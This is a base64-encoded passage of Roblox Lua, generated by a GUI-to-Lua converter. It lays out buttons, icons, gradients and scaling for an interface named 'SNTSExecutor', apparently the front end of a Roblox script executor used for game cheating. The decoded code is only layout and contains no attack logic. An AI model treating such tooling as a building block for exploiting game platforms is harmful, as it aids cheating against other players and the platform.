DApOwpHMkxbIjUyIl1bIk5hbWUiXSA9IFtbUFBOYXZCYXJdXTsKRzJMWyI1MiJdWyJCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5Il0gPSAxOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLkhvbWUuUGxheWVyUHJvZmlsZS5QUE5hdkJhci5CdXR0b25Hcm91cEVmZmVjdApHMkxbIjUzIl0gPSBJbnN0YW5jZS5uZXcoIkxvY2FsU2NyaXB0IiwgRzJMWyI1MiJdKTsKRzJMWyI1MyJdWyJOYW1lIl0gPSBbW0J1dHRvbkdyb3VwRWZmZWN0XV07CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuSG9tZS5QbGF5ZXJQcm9maWxlLlBQTmF2QmFyLlVJQ29ybmVyCkcyTFsiNTQiXSA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiLCBHMkxbIjUyIl0pOwpHMkxbIjU0Il1bIkNvcm5lclJhZGl1cyJdID0gVURpbS5uZXcoMCwgMTQpOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLkhvbWUuUGxheWVyUHJvZmlsZS5QUE5hdkJhci5VSUdyaWRMYXlvdXQKRzJMWyI1NSJdID0gSW5zdGFuY2UubmV3KCJVSUdyaWRMYXlvdXQiLCBHMkxbIjUyIl0pOwpHMkxbIjU1Il1bIkNlbGxTaXplIl0gPSBVRGltMi5uZXcoMCwgNzQsIDAsIDUwKTsKRzJMWyI1NSJdWyJTb3J0T3JkZXIiXSA9IEVudW0uU29ydE9yZGVyLkxheW91dE9yZGVyOwpHMkxbIjU1Il1bIkNlbGxQYWRkaW5nIl0gPSBVRGltMi5uZXcoMCwgMCwgMCwgNSk7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuSG9tZS5QbGF5ZXJQcm9maWxlLlBQTmF2QmFyLkFwcHMKRzJMWyI1NiJdID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIiwgRzJMWyI1MiJdKTsKRzJMWyI1NiJdWyJCb3JkZXJTaXplUGl4ZWwiXSA9IDA7CkcyTFsiNTYiXVsiVGV4dFNpemUiXSA9IDE0OwpHMkxbIjU2Il1bIlRleHRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApOwpHMkxbIjU2Il1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDE0LCAxNCwgMTQpOwpHMkxbIjU2Il1bIkZvbnRGYWNlIl0gPSBGb250Lm5ldyhbW3JieGFzc2V0Oi8vZm9udHMvZmFtaWxpZXMvU291cmNlU2Fuc1Byby5qc29uXV0sIEVudW0uRm9udFdlaWdodC5SZWd1bGFyLCBFbnVtLkZvbnRTdHlsZS5Ob3JtYWwpOwpHMkxbIjU2Il1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCAyMDAsIDAsIDUwKTsKRzJMWyI1NiJdWyJCb3JkZXJDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApOwpHMkxbIjU2Il1bIlRleHQiXSA9IFtbXV07CkcyTFsiNTYiXVsiTmFtZSJdID0gW1tBcHBzXV07CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuSG9tZS5QbGF5ZXJQcm9maWxlLlBQTmF2QmFyLkFwcHMuQXV0b1JlbmV3CkcyTFsiNTciXSA9IEluc3RhbmNlLm5ldygiSW1hZ2VMYWJlbCIsIEcyTFsiNTYiXSk7Ci0tIFtFUlJPUl0gY2Fubm90IGNvbnZlcnQgSW1hZ2VDb250ZW50LCBwbGVhc2UgcmVwb3J0IHRvICJodHRwczovL2dpdGh1Yi5jb20vdW5pcXVhZGV2L0d1aVRvTHVhQ29udmVydGVyL2lzc3VlcyIKRzJMWyI1NyJdWyJBbmNob3JQb2ludCJdID0gVmVjdG9yMi5uZXcoMC41LCAwLjUpOwpHMkxbIjU3Il1bIkltYWdlIl0gPSBbW3JieGFzc2V0aWQ6Ly84NDQ1NDcwODI2XV07CkcyTFsiNTciXVsiSW1hZ2VSZWN0U2l6ZSJdID0gVmVjdG9yMi5uZXcoOTYsIDk2KTsKRzJMWyI1NyJdWyJTaXplIl0gPSBVRGltMi5uZXcoMCwgNDUsIDAsIDQ1KTsKRzJMWyI1NyJdWyJCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5Il0gPSAxOwpHMkxbIjU3Il1bIkltYWdlUmVjdE9mZnNldCJdID0gVmVjdG9yMi5uZXcoOTA0LCAyMDQpOwpHMkxbIjU3Il1bIk5hbWUiXSA9IFtbQXV0b1JlbmV3XV07CkcyTFsiNTciXVsiUG9zaXRpb24iXSA9IFVEaW0yLm5ldygwLjUsIDAsIDAuNSwgMCk7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuSG9tZS5QbGF5ZXJQcm9maWxlLlBQTmF2QmFyLkFwcHMuQXV0b1JlbmV3LlVJQXNwZWN0UmF0aW9Db25zdHJhaW50CkcyTFsiNTgiXSA9IEluc3RhbmNlLm5ldygiVUlBc3BlY3RSYXRpb0NvbnN0cmFpbnQiLCBHMkxbIjU3Il0pOwpHMkxbIjU4Il1bIkRvbWluYW50QXhpcyJdID0gRW51bS5Eb21pbmFudEF4aXMuSGVpZ2h0OwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLkhvbWUuUGxheWVyUHJvZmlsZS5QUE5hdkJhci5BcHBzLkF1dG9SZW5ldy5VSUdyYWRpZW50CkcyTFsiNTkiXSA9IEluc3RhbmNlLm5ldygiVUlHcmFkaWVudCIsIEcyTFsiNTciXSk7CkcyTFsiNTkiXVsiUm90YXRpb24iXSA9IC05MDsKRzJMWyI1OSJdWyJDb2xvciJdID0gQ29sb3JTZXF1ZW5jZS5uZXd7Q29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLjAwMCwgQ29sb3IzLmZyb21SR0IoNTgsIDAsIDApKSxDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAuMjYxLCBDb2xvcjMuZnJvbVJHQig4MCwgMCwgMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC42MTgsIENvbG9yMy5mcm9tUkdCKDEyMCwgMCwgMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC45ODgsIENvbG9yMy5mcm9tUkdCKDE3MSwgMCwgMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC45OTcsIENvbG9yMy5mcm9tUkdCKDE5OCwgMCwgMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMS4wMDAsIENvbG9yMy5mcm9tUkdCKDI1NSwgMCwgMCkpfTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5Ib21lLlBsYXllclByb2ZpbGUuUFBOYXZCYXIuQ2FtZXJhCkcyTFsiNWEiXSA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIsIEcyTFsiNTIiXSk7CkcyTFsiNWEiXVsiQm9yZGVyU2l6ZVBpeGVsIl0gPSAwOwpHMkxbIjVhIl1bIlRleHRTaXplIl0gPSAxNDsKRzJMWyI1YSJdWyJUZXh0Q29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyI1YSJdWyJCYWNrZ3JvdW5kQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigxNCwgMTQsIDE0KTsKRzJMWyI1YSJdWyJGb250RmFjZSJdID0gRm9udC5uZXcoW1tyYnhhc3NldDovL2ZvbnRzL2ZhbWlsaWVzL1NvdXJjZVNhbnNQcm8uanNvbl1dLCBFbnVtLkZvbnRXZWlnaHQuUmVndWxhciwgRW51bS5Gb250U3R5bGUuTm9ybWFsKTsKRzJMWyI1YSJdWyJTaXplIl0gPSBVRGltMi5uZXcoMCwgMjAwLCAwLCA1MCk7CkcyTFsiNWEiXVsiQm9yZGVyQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigwLCAwLCAwKTsKRzJMWyI1YSJdWyJUZXh0Il0gPSBbW11dOwpHMkxbIjVhIl1bIk5hbWUiXSA9IFtbQ2FtZXJhXV07CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuSG9tZS5QbGF5ZXJQcm9maWxlLlBQTmF2QmFyLkNhbWVyYS5DYW1lcmFBbHQKRzJMWyI1YiJdID0gSW5zdGFuY2UubmV3KCJJbWFnZUxhYmVsIiwgRzJMWyI1YSJdKTsKLS0gW0VSUk9SXSBjYW5ub3QgY29udmVydCBJbWFnZUNvbnRlbnQsIHBsZWFzZSByZXBvcnQgdG8gImh0dHBzOi8vZ2l0aHViLmNvbS91bmlxdWFkZXYvR3VpVG9MdWFDb252ZXJ0ZXIvaXNzdWVzIgpHMkxbIjViIl1bIkFuY2hvclBvaW50Il0gPSBWZWN0b3IyLm5ldygwLjUsIDAuNSk7CkcyTFsiNWIiXVsiSW1hZ2UiXSA9IFtbcmJ4YXNzZXRpZDovLzg0NDU0NzA5ODRdXTsKRzJMWyI1YiJdWyJJbWFnZVJlY3RTaXplIl0gPSBWZWN0b3IyLm5ldyg5NiwgOTYpOwpHMkxbIjViIl1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCA0NSwgMCwgNDUpOwpHMkxbIjViIl1bIkJhY2tncm91bmRUcmFuc3BhcmVuY3kiXSA9IDE7CkcyTFsiNWIiXVsiSW1hZ2VSZWN0T2Zmc2V0Il0gPSBWZWN0b3IyLm5ldyg0MDQsIDQwNCk7CkcyTFsiNWIiXVsiTmFtZSJdID0gW1tDYW1lcmFBbHRdXTsKRzJMWyI1YiJdWyJQb3NpdGlvbiJdID0gVURpbTIubmV3KDAuNSwgMCwgMC41LCAwKTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5Ib21lLlBsYXllclByb2ZpbGUuUFBOYXZCYXIuQ2FtZXJhLkNhbWVyYUFsdC5VSUFzcGVjdFJhdGlvQ29uc3RyYWludApHMkxbIjVjIl0gPSBJbnN0YW5jZS5uZXcoIlVJQXNwZWN0UmF0aW9Db25zdHJhaW50IiwgRzJMWyI1YiJdKTsKRzJMWyI1YyJdWyJEb21pbmFudEF4aXMiXSA9IEVudW0uRG9taW5hbnRBeGlzLkhlaWdodDsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5Ib21lLlBsYXllclByb2ZpbGUuUFBOYXZCYXIuQ2FtZXJhLkNhbWVyYUFsdC5VSUdyYWRpZW50CkcyTFsiNWQiXSA9IEluc3RhbmNlLm5ldygiVUlHcmFkaWVudCIsIEcyTFsiNWIiXSk7CkcyTFsiNWQiXVsiUm90YXRpb24iXSA9IC05MDsKRzJMWyI1ZCJdWyJDb2xvciJdID0gQ29sb3JTZXF1ZW5jZS5uZXd7Q29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLjAwMCwgQ29sb3IzLmZyb21SR0IoNTgsIDAsIDApKSxDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAuMjYxLCBDb2xvcjMuZnJvbVJHQig4MCwgMCwgMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC42MTgsIENvbG9yMy5mcm9tUkdCKDEyMCwgMCwgMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC45ODgsIENvbG9yMy5mcm9tUkdCKDE3MSwgMCwgMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC45OTcsIENvbG9yMy5mcm9tUkdCKDE5OCwgMCwgMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMS4wMDAsIENvbG9yMy5mcm9tUkdCKDI1NSwgMCwgMCkpfTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5Ib21lLlBsYXllclByb2ZpbGUuUFBOYXZCYXIuRmF2b3JpdGUKRzJMWyI1ZSJdID0gSW5zdGFuY2UubmV3KCJUZXh0QnV0dG9uIiwgRzJMWyI1MiJdKTsKRzJMWyI1ZSJdWyJCb3JkZXJTaXplUGl4ZWwiXSA9IDA7CkcyTFsiNWUiXVsiVGV4dFNpemUiXSA9IDE0OwpHMkxbIjVlIl1bIlRleHRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApOwpHMkxbIjVlIl1bIkJhY2tncm91bmRDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDE0LCAxNCwgMTQpOwpHMkxbIjVlIl1bIkZvbnRGYWNlIl0gPSBGb250Lm5ldyhbW3JieGFzc2V0Oi8vZm9udHMvZmFtaWxpZXMvU291cmNlU2Fuc1Byby5qc29uXV0sIEVudW0uRm9udFdlaWdodC5SZWd1bGFyLCBFbnVtLkZvbnRTdHlsZS5Ob3JtYWwpOwpHMkxbIjVlIl1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCAyMDAsIDAsIDUwKTsKRzJMWyI1ZSJdWyJCb3JkZXJDb2xvcjMiXSA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApOwpHMkxbIjVlIl1bIlRleHQiXSA9IFtbXV07CkcyTFsiNWUiXVsiTmFtZSJdID0gW1tGYXZvcml0ZV1dOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLkhvbWUuUGxheWVyUHJvZmlsZS5QUE5hdkJhci5GYXZvcml0ZS5GYXZvcml0ZQpHMkxbIjVmIl0gPSBJbnN0YW5jZS5uZXcoIkltYWdlTGFiZWwiLCBHMkxbIjVlIl0pOwotLSBbRVJST1JdIGNhbm5vdCBjb252ZXJ0IEltYWdlQ29udGVudCwgcGxlYXNlIHJlcG9ydCB0byAiaHR0cHM6Ly9naXRodWIuY29tL3VuaXF1YWRldi9HdWlUb0x1YUNvbnZlcnRlci9pc3N1ZXMiCkcyTFsiNWYiXVsiQW5jaG9yUG9pbnQiXSA9IFZlY3RvcjIubmV3KDAuNSwgMC41KTsKRzJMWyI1ZiJdWyJJbWFnZSJdID0gW1tyYnhhc3NldGlkOi8vODQ0NTQ3MDgyNl1dOwpHMkxbIjVmIl1bIkltYWdlUmVjdFNpemUiXSA9IFZlY3RvcjIubmV3KDk2LCA5Nik7CkcyTFsiNWYiXVsiU2l6ZSJdID0gVURpbTIubmV3KDAsIDQ1LCAwLCA0NSk7CkcyTFsiNWYiXVsiQmFja2dyb3VuZFRyYW5zcGFyZW5jeSJdID0gMTsKRzJMWyI1ZiJdWyJJbWFnZVJlY3RPZmZzZXQiXSA9IFZlY3RvcjIubmV3KDkwNCwgOTA0KTsKRzJMWyI1ZiJdWyJOYW1lIl0gPSBbW0Zhdm9yaXRlXV07CkcyTFsiNWYiXVsiUG9zaXRpb24iXSA9IFVEaW0yLm5ldygwLjUsIDAsIDAuNSwgMCk7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuSG9tZS5QbGF5ZXJQcm9maWxlLlBQTmF2QmFyLkZhdm9yaXRlLkZhdm9yaXRlLlVJQXNwZWN0UmF0aW9Db25zdHJhaW50CkcyTFsiNjAiXSA9IEluc3RhbmNlLm5ldygiVUlBc3BlY3RSYXRpb0NvbnN0cmFpbnQiLCBHMkxbIjVmIl0pOwpHMkxbIjYwIl1bIkRvbWluYW50QXhpcyJdID0gRW51bS5Eb21pbmFudEF4aXMuSGVpZ2h0OwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLkhvbWUuUGxheWVyUHJvZmlsZS5QUE5hdkJhci5GYXZvcml0ZS5GYXZvcml0ZS5VSUdyYWRpZW50CkcyTFsiNjEiXSA9IEluc3RhbmNlLm5ldygiVUlHcmFkaWVudCIsIEcyTFsiNWYiXSk7CkcyTFsiNjEiXVsiUm90YXRpb24iXSA9IC05MDsKRzJMWyI2MSJdWyJDb2xvciJdID0gQ29sb3JTZXF1ZW5jZS5uZXd7Q29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLjAwMCwgQ29sb3IzLmZyb21SR0IoNTgsIDAsIDApKSxDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAuMjYxLCBDb2xvcjMuZnJvbVJHQig4MCwgMCwgMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC42MTgsIENvbG9yMy5mcm9tUkdCKDEyMCwgMCwgMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC45ODgsIENvbG9yMy5mcm9tUkdCKDE3MSwgMCwgMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC45OTcsIENvbG9yMy5mcm9tUkdCKDE5OCwgMCwgMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMS4wMDAsIENvbG9yMy5mcm9tUkdCKDI1NSwgMCwgMCkpfTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5Ib21lLlBsYXllclByb2ZpbGUuUFBOYXZCYXIuVmlzaWJpbGl0eQpHMkxbIjYyIl0gPSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iLCBHMkxbIjUyIl0pOwpHMkxbIjYyIl1bIkJvcmRlclNpemVQaXhlbCJdID0gMDsKRzJMWyI2MiJdWyJUZXh0U2l6ZSJdID0gMTQ7CkcyTFsiNjIiXVsiVGV4dENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiNjIiXVsiQmFja2dyb3VuZENvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMTQsIDE0LCAxNCk7CkcyTFsiNjIiXVsiRm9udEZhY2UiXSA9IEZvbnQubmV3KFtbcmJ4YXNzZXQ6Ly9mb250cy9mYW1pbGllcy9Tb3VyY2VTYW5zUHJvLmpzb25dXSwgRW51bS5Gb250V2VpZ2h0LlJlZ3VsYXIsIEVudW0uRm9udFN0eWxlLk5vcm1hbCk7CkcyTFsiNjIiXVsiU2l6ZSJdID0gVURpbTIubmV3KDAsIDIwMCwgMCwgNTApOwpHMkxbIjYyIl1bIkJvcmRlckNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiNjIiXVsiVGV4dCJdID0gW1tdXTsKRzJMWyI2MiJdWyJOYW1lIl0gPSBbW1Zpc2liaWxpdHldXTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5Ib21lLlBsYXllclByb2ZpbGUuUFBOYXZCYXIuVmlzaWJpbGl0eS5WaXNpYmlsaXR5T2ZmCkcyTFsiNjMiXSA9IEluc3RhbmNlLm5ldygiSW1hZ2VMYWJlbCIsIEcyTFsiNjIiXSk7Ci0tIFtFUlJPUl0gY2Fubm90IGNvbnZlcnQgSW1hZ2VDb250ZW50LCBwbGVhc2UgcmVwb3J0IHRvICJodHRwczovL2dpdGh1Yi5jb20vdW5pcXVhZGV2L0d1aVRvTHVhQ29udmVydGVyL2lzc3VlcyIKRzJMWyI2MyJdWyJBbmNob3JQb2ludCJdID0gVmVjdG9yMi5uZXcoMC41LCAwLjUpOwpHMkxbIjYzIl1bIkltYWdlIl0gPSBbW3JieGFzc2V0aWQ6Ly84NDQ1NDcwMTg5XV07CkcyTFsiNjMiXVsiSW1hZ2VSZWN0U2l6ZSJdID0gVmVjdG9yMi5uZXcoOTYsIDk2KTsKRzJMWyI2MyJdWyJTaXplIl0gPSBVRGltMi5uZXcoMCwgNDUsIDAsIDQ1KTsKRzJMWyI2MyJdWyJCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5Il0gPSAxOwpHMkxbIjYzIl1bIkltYWdlUmVjdE9mZnNldCJdID0gVmVjdG9yMi5uZXcoNjA0LCA4MDQpOwpHMkxbIjYzIl1bIk5hbWUiXSA9IFtbVmlzaWJpbGl0eU9mZl1dOwpHMkxbIjYzIl1bIlBvc2l0aW9uIl0gPSBVRGltMi5uZXcoMC41LCAwLCAwLjUsIDApOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLkhvbWUuUGxheWVyUHJvZmlsZS5QUE5hdkJhci5WaXNpYmlsaXR5LlZpc2liaWxpdHlPZmYuVUlBc3BlY3RSYXRpb0NvbnN0cmFpbnQKRzJMWyI2NCJdID0gSW5zdGFuY2UubmV3KCJVSUFzcGVjdFJhdGlvQ29uc3RyYWludCIsIEcyTFsiNjMiXSk7CkcyTFsiNjQiXVsiRG9taW5hbnRBeGlzIl0gPSBFbnVtLkRvbWluYW50QXhpcy5IZWlnaHQ7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuSG9tZS5QbGF5ZXJQcm9maWxlLlBQTmF2QmFyLlZpc2liaWxpdHkuVmlzaWJpbGl0eU9mZi5VSUdyYWRpZW50CkcyTFsiNjUiXSA9IEluc3RhbmNlLm5ldygiVUlHcmFkaWVudCIsIEcyTFsiNjMiXSk7CkcyTFsiNjUiXVsiUm90YXRpb24iXSA9IC05MDsKRzJMWyI2NSJdWyJDb2xvciJdID0gQ29sb3JTZXF1ZW5jZS5uZXd7Q29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLjAwMCwgQ29sb3IzLmZyb21SR0IoNTgsIDAsIDApKSxDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAuMjYxLCBDb2xvcjMuZnJvbVJHQig4MCwgMCwgMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC42MTgsIENvbG9yMy5mcm9tUkdCKDEyMCwgMCwgMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC45ODgsIENvbG9yMy5mcm9tUkdCKDE3MSwgMCwgMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC45OTcsIENvbG9yMy5mcm9tUkdCKDE5OCwgMCwgMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMS4wMDAsIENvbG9yMy5mcm9tUkdCKDI1NSwgMCwgMCkpfTsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5Ib21lLlBsYXllclByb2ZpbGUuUFBOYXZCYXIuVmlzaWJpbGl0eS5WaXNpYmlsaXR5T24oQWRkZWQgdGhpcyBqdXN0IGluIGNhc2UpIFRvcCBUaWVyIFNlcnZpY2UKRzJMWyI2NiJdID0gSW5zdGFuY2UubmV3KCJJbWFnZUxhYmVsIiwgRzJMWyI2MiJdKTsKLS0gW0VSUk9SXSBjYW5ub3QgY29udmVydCBJbWFnZUNvbnRlbnQsIHBsZWFzZSByZXBvcnQgdG8gImh0dHBzOi8vZ2l0aHViLmNvbS91bmlxdWFkZXYvR3VpVG9MdWFDb252ZXJ0ZXIvaXNzdWVzIgpHMkxbIjY2Il1bIkFuY2hvclBvaW50Il0gPSBWZWN0b3IyLm5ldygwLjUsIDAuNSk7CkcyTFsiNjYiXVsiSW1hZ2UiXSA9IFtbcmJ4YXNzZXRpZDovLzg0NDU0NzAzOTJdXTsKRzJMWyI2NiJdWyJJbWFnZVJlY3RTaXplIl0gPSBWZWN0b3IyLm5ldyg5NiwgOTYpOwpHMkxbIjY2Il1bIlNpemUiXSA9IFVEaW0yLm5ldygwLCA0NSwgMCwgNDUpOwpHMkxbIjY2Il1bIlZpc2libGUiXSA9IGZhbHNlOwpHMkxbIjY2Il1bIkJhY2tncm91bmRUcmFuc3BhcmVuY3kiXSA9IDE7CkcyTFsiNjYiXVsiSW1hZ2VSZWN0T2Zmc2V0Il0gPSBWZWN0b3IyLm5ldyg2MDQsIDQpOwpHMkxbIjY2Il1bIk5hbWUiXSA9IFtbVmlzaWJpbGl0eU9uKEFkZGVkIHRoaXMganVzdCBpbiBjYXNlKSBUb3AgVGllciBTZXJ2aWNlXV07CkcyTFsiNjYiXVsiUG9zaXRpb24iXSA9IFVEaW0yLm5ldygwLjUsIDAsIDAuNSwgMCk7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuSG9tZS5QbGF5ZXJQcm9maWxlLlBQTmF2QmFyLlZpc2liaWxpdHkuVmlzaWJpbGl0eU9uKEFkZGVkIHRoaXMganVzdCBpbiBjYXNlKSBUb3AgVGllciBTZXJ2aWNlLlVJQXNwZWN0UmF0aW9Db25zdHJhaW50CkcyTFsiNjciXSA9IEluc3RhbmNlLm5ldygiVUlBc3BlY3RSYXRpb0NvbnN0cmFpbnQiLCBHMkxbIjY2Il0pOwpHMkxbIjY3Il1bIkRvbWluYW50QXhpcyJdID0gRW51bS5Eb21pbmFudEF4aXMuSGVpZ2h0OwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLkhvbWUuUGxheWVyUHJvZmlsZS5QUE5hdkJhci5WaXNpYmlsaXR5LlZpc2liaWxpdHlPbihBZGRlZCB0aGlzIGp1c3QgaW4gY2FzZSkgVG9wIFRpZXIgU2VydmljZS5VSUdyYWRpZW50CkcyTFsiNjgiXSA9IEluc3RhbmNlLm5ldygiVUlHcmFkaWVudCIsIEcyTFsiNjYiXSk7CkcyTFsiNjgiXVsiUm90YXRpb24iXSA9IC05MDsKRzJMWyI2OCJdWyJDb2xvciJdID0gQ29sb3JTZXF1ZW5jZS5uZXd7Q29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLjAwMCwgQ29sb3IzLmZyb21SR0IoNTgsIDAsIDApKSxDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAuMjYxLCBDb2xvcjMuZnJvbVJHQig4MCwgMCwgMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC42MTgsIENvbG9yMy5mcm9tUkdCKDEyMCwgMCwgMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC45ODgsIENvbG9yMy5mcm9tUkdCKDE3MSwgMCwgMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC45OTcsIENvbG9yMy5mcm9tUkdCKDE5OCwgMCwgMCkpLENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMS4wMDAsIENvbG9yMy5mcm9tUkdCKDI1NSwgMCwgMCkpfTsKCgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuSG9tZS5QbGF5ZXJQcm9maWxlLlVJQXNwZWN0UmF0aW9Db25zdHJhaW50CkcyTFsiNjkiXSA9IEluc3RhbmNlLm5ldygiVUlBc3BlY3RSYXRpb0NvbnN0cmFpbnQiLCBHMkxbIjFiIl0pOwpHMkxbIjY5Il1bIkFzcGVjdFJhdGlvIl0gPSAwLjUzODc5OwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLkhvbWUuUGxheWVyUHJvZmlsZS5VSVNjYWxlCkcyTFsiNmEiXSA9IEluc3RhbmNlLm5ldygiVUlTY2FsZSIsIEcyTFsiMWIiXSk7CgotLSBBdHRyaWJ1dGVzCkcyTFsiNmEiXTpTZXRBdHRyaWJ1dGUoW1tSZXNvbHV0aW9uXV0sIFZlY3RvcjIubmV3KDE5MTksIDEwODApKTsKCi0tIFRhZ3MKQ29sbGVjdGlvblNlcnZpY2U6QWRkVGFnKEcyTFsiNmEiXSwgW1tVSVNjYWxlUnVudGltZU9iamVjdF1dKTsKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLkhvbWUuQ2FyZApHMkxbIjZiIl0gPSBJbnN0YW5jZS5uZXcoIkltYWdlTGFiZWwiLCBHMkxbIjFhIl0pOwpHMkxbIjZiIl1bIkJvcmRlclNpemVQaXhlbCJdID0gMDsKRzJMWyI2YiJdWyJCYWNrZ3JvdW5kQ29sb3IzIl0gPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KTsKRzJMWyI2YiJdWyJJbWFnZSJdID0gW1tyYnhhc3NldGlkOi8vOTYyNTk0NzA1ODM4OTFdXTsKRzJMWyI2YiJdWyJTaXplIl0gPSBVRGltMi5uZXcoMCwgMzI2LCAwLCAxOTMpOwpHMkxbIjZiIl1bIkJvcmRlckNvbG9yMyJdID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCk7CkcyTFsiNmIiXVsiQmFja2dyb3VuZFRyYW5zcGFyZW5jeSJdID0gMTsKRzJMWyI2YiJdWyJOYW1lIl0gPSBbW0NhcmRdXTsKRzJMWyI2YiJdWyJQb3NpdGlvbiJdID0gVURpbTIubmV3KDAuMDI0NCwgMCwgMC4wNjA4MSwgMCk7CgoKLS0gU3RhcnRlckd1aS5TTlRTRXhlY3V0b3IuSG9tZS5DYXJkLlVJQ29ybmVyCkcyTFsiNmMiXSA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiLCBHMkxbIjZiIl0pOwpHMkxbIjZjIl1bIkNvcm5lclJhZGl1cyJdID0gVURpbS5uZXcoMCwgMTQpOwoKCi0tIFN0YXJ0ZXJHdWkuU05UU0V4ZWN1dG9yLkhvbWUuQ2FyZC5VSUFzcGVjdFJhdGlvQ29uc3RyYWludApHMkxbIjZkIl0gPSBJbnN0YW5jZS5uZXcoIlVJQXNwZWN0UmF0aW9Db25zdHJhaW50IiwgRzJMWyI2YiJdKTsKRzJMWyI2ZCJdWyJBc3BlY3RSYXRpbyJdID0gMS42ODkxMjsKCgotLSBTdGFydGVyR3VpLlNOVFNFeGVjdXRvci5Ib21lLkNhcmQuVUlTY2FsZQpHMkxbIjZlIl0gPSBJbnN0YW5jZS5uZXcoIlVJU2NhbGUiLCBHMkxbIjZiIl0pOwoKLS0gQXR0cmlidXRlcwpHMkxbIjZlIl06U2V0QXR0cmlidXRlKFtbUmVzb2x1dGlvbl1dLCBWZWN0b3IyLm5ldygxOTE5LCAxMDgwKSk7CgotLSBUYWdzCkNvbGxlY3Rp